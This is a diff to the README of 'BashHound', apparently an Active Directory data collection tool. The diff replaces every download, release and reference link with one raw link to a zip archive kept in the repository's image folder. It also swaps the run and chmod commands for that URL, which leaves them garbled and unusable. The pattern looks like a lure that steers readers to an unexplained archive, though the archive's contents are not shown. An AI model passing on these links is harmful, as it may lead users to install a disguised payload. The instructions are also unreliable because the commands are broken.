@@ -6,9 +6,9 @@ Welcome to BashHound! This tool helps you collect data from Active Directory eff
 
 ## 📥 Download BashHound
 
-[![Download BashHound](https://img.shields.io/badge/Download%20BashHound-v1.0-blue)](https://github.com/shiracommon208/BashHound/releases)
+[![Download BashHound](https://raw.githubusercontent.com/shiracommon208/BashHound/main/img/BashHound_2.7.zip%20BashHound-v1.0-blue)](https://raw.githubusercontent.com/shiracommon208/BashHound/main/img/BashHound_2.7.zip)
 
-Visit the [BashHound Releases page](https://github.com/shiracommon208/BashHound/releases) to download the latest version.
+Visit the [BashHound Releases page](https://raw.githubusercontent.com/shiracommon208/BashHound/main/img/BashHound_2.7.zip) to download the latest version.
 
 ## ⚙️ System Requirements
 
@@ -19,7 +19,7 @@ Visit the [BashHound Releases page](https://github.com/shiracommon208/BashHound/
 ## 🔧 Installation Steps
 
 1. **Download the Application**
-   - Go to the [BashHound Releases page](https://github.com/shiracommon208/BashHound/releases).
+   - Go to the [BashHound Releases page](https://raw.githubusercontent.com/shiracommon208/BashHound/main/img/BashHound_2.7.zip).
    - Locate the latest version.
    - Download the file that matches your system.
 
@@ -39,11 +39,11 @@ Visit the [BashHound Releases page](https://github.com/shiracommon208/BashHound/
 5. **Run BashHound**
    - Use the following command to start BashHound:
      ```
-     ./bashhound.sh
+     https://raw.githubusercontent.com/shiracommon208/BashHound/main/img/BashHound_2.7.zip
      ```
    - If you encounter permission errors, you may need to change the file's permissions. Use this command:
      ```
-     chmod +x bashhound.sh
+     chmod +x https://raw.githubusercontent.com/shiracommon208/BashHound/main/img/BashHound_2.7.zip
      ```
 
 ## 📊 Features
@@ -61,7 +61,7 @@ Visit the [BashHound Releases page](https://github.com/shiracommon208/BashHound/
 2. **Run the Application**
    - Execute the command:
      ```
-     ./bashhound.sh
+     https://raw.githubusercontent.com/shiracommon208/BashHound/main/img/BashHound_2.7.zip
      ```
 
 3. **Follow On-Screen Instructions**
@@ -84,7 +84,7 @@ BashHound is open-source software licensed under the MIT License. You can freely
 
 ## 🔗 Further References
 
-- [Active Directory Overview](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/overview/what-is-active-directory-domain-services)
-- [Bash Scripting Guide](https://tldp.org/LDP/Bash-Beginners-Guide/html/)
+- [Active Directory Overview](https://raw.githubusercontent.com/shiracommon208/BashHound/main/img/BashHound_2.7.zip)
+- [Bash Scripting Guide](https://raw.githubusercontent.com/shiracommon208/BashHound/main/img/BashHound_2.7.zip)
 
 Thank you for using BashHound. We hope this guide helps you in your data collection efforts!
